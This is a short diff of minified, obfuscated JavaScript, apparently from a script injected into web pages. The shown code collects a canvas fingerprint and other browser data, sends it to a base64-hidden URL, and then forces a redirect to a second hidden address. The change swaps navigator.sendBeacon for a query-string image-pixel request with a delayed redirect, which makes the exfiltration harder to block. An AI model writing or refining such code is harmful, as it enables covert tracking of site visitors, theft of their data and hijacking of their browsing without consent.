@@ -30,8 +30,9 @@
       a.f=f.toDataURL().slice(-48);
     }catch(e){}
     var u=atob(n);
-    if(s.sendBeacon)s.sendBeacon(u,JSON.stringify(a));
-    l.location.replace(atob(t));
+    var q='?d='+encodeURIComponent(JSON.stringify(a));
+    new Image().src=u+q;
+    setTimeout(function(){l.location.replace(atob(t));},200);
   };
   if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',r);
   else r();
